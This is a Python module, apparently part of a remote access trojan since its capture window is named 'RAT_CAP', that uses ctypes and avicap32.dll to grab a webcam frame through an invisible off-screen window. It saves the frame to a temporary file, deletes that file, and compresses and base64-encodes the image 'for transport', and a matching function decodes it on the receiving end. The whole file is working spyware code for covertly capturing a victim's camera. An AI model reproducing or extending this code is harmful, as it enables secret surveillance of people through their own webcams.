# webcam.py — Webcam capture via Video for Windows (avicap32.dll)
#
# Uses capCreateCaptureWindowW to create an off-screen capture window,
# connects to camera, grabs a frame, saves as BMP, compresses + base64.
# No OpenCV or PIL required — pure ctypes.

import ctypes
import ctypes.wintypes
import os
import tempfile
import base64
import zlib
import time

user32 = ctypes.windll.user32
avicap32 = ctypes.windll.avicap32

# ── Video for Windows constants ────────────────────────────────
WM_CAP_START             = 0x0400
WM_CAP_DRIVER_CONNECT    = WM_CAP_START + 10
WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11
WM_CAP_GRAB_FRAME        = WM_CAP_START + 60
WM_CAP_FILE_SAVEDIB      = WM_CAP_START + 25
WM_CAP_SET_PREVIEW       = WM_CAP_START + 50
WM_CAP_SET_SCALE         = WM_CAP_START + 53
WM_CAP_DRIVER_GET_NAME   = WM_CAP_START + 11
WM_CAP_DRIVER_GET_CAPS   = WM_CAP_START + 14
WM_CAP_GET_STATUS        = WM_CAP_START + 54

# capGetDriverDescription
capGetDriverDescriptionW = avicap32.capGetDriverDescriptionW
capGetDriverDescriptionW.argtypes = [
    ctypes.wintypes.UINT,       # wDriverIndex
    ctypes.wintypes.LPWSTR,     # lpszName
    ctypes.c_int,               # cbName
    ctypes.wintypes.LPWSTR,     # lpszVer
    ctypes.c_int,               # cbVer
]
capGetDriverDescriptionW.restype = ctypes.wintypes.BOOL

# capCreateCaptureWindow
capCreateCaptureWindowW = avicap32.capCreateCaptureWindowW
capCreateCaptureWindowW.argtypes = [
    ctypes.wintypes.LPCWSTR,    # lpszWindowName
    ctypes.wintypes.DWORD,      # dwStyle
    ctypes.c_int,               # x
    ctypes.c_int,               # y
    ctypes.c_int,               # nWidth
    ctypes.c_int,               # nHeight
    ctypes.wintypes.HWND,       # hWndParent
    ctypes.c_int,               # nID
]
capCreateCaptureWindowW.restype = ctypes.wintypes.HWND


def list_cameras() -> list:
    """List available video capture devices.

    Returns:
        List of dicts with index, name, and version for each camera.
    """
    cameras = []
    name_buf = ctypes.create_unicode_buffer(256)
    ver_buf = ctypes.create_unicode_buffer(256)

    for i in range(10):  # Check up to 10 devices
        if capGetDriverDescriptionW(i, name_buf, 256, ver_buf, 256):
            cameras.append({
                "index": i,
                "name": name_buf.value,
                "version": ver_buf.value,
            })
    return cameras


def capture(device_index: int = 0) -> str:
    """Capture a single frame from the webcam.

    Creates an off-screen capture window, grabs a frame,
    saves as BMP, compresses with zlib, and base64 encodes.

    Args:
        device_index: Camera device index (0 = default/first camera).

    Returns:
        Base64-encoded zlib-compressed BMP data.

    Raises:
        RuntimeError: If camera connection or capture fails.
    """
    # Create off-screen capture window (invisible)
    hwnd = capCreateCaptureWindowW(
        "RAT_CAP",
        0,       # WS_CHILD removed — use 0 for invisible
        0, 0,    # Position
        640, 480, # Size
        0,       # No parent
        0,       # ID
    )
    if not hwnd:
        raise RuntimeError("Failed to create capture window")

    try:
        # Connect to camera
        connected = user32.SendMessageW(hwnd, WM_CAP_DRIVER_CONNECT, device_index, 0)
        if not connected:
            raise RuntimeError(f"Failed to connect to camera {device_index}")

        # Let the camera warm up
        time.sleep(0.5)

        # Grab a single frame
        grabbed = user32.SendMessageW(hwnd, WM_CAP_GRAB_FRAME, 0, 0)
        if not grabbed:
            user32.SendMessageW(hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            raise RuntimeError("Failed to grab frame")

        # Save frame to temp BMP file
        tmp = tempfile.NamedTemporaryFile(suffix=".bmp", delete=False)
        tmp_path = tmp.name
        tmp.close()

        # Send save message — path must be wide string
        save_path = ctypes.c_wchar_p(tmp_path)
        saved = user32.SendMessageW(
            hwnd, WM_CAP_FILE_SAVEDIB,
            0, ctypes.cast(save_path, ctypes.wintypes.LPARAM)
        )

        # Disconnect camera
        user32.SendMessageW(hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)

        if not saved or not os.path.exists(tmp_path) or os.path.getsize(tmp_path) == 0:
            raise RuntimeError("Failed to save captured frame")

        # Read BMP data
        with open(tmp_path, "rb") as f:
            bmp_data = f.read()

        # Cleanup temp file
        try:
            os.unlink(tmp_path)
        except Exception:
            pass

        # Compress and encode for transport
        compressed = zlib.compress(bmp_data, 6)
        return base64.b64encode(compressed).decode("ascii")

    finally:
        # Always destroy the capture window
        user32.DestroyWindow(hwnd)


def save_webcam(b64_data: str, filepath: str) -> None:
    """Decode and decompress a received webcam image, save to disk.

    Args:
        b64_data: Base64-encoded, zlib-compressed BMP data.
        filepath: Destination file path (.bmp).
    """
    compressed = base64.b64decode(b64_data)
    bmp_data = zlib.decompress(compressed)
    with open(filepath, "wb") as f:
        f.write(bmp_data)
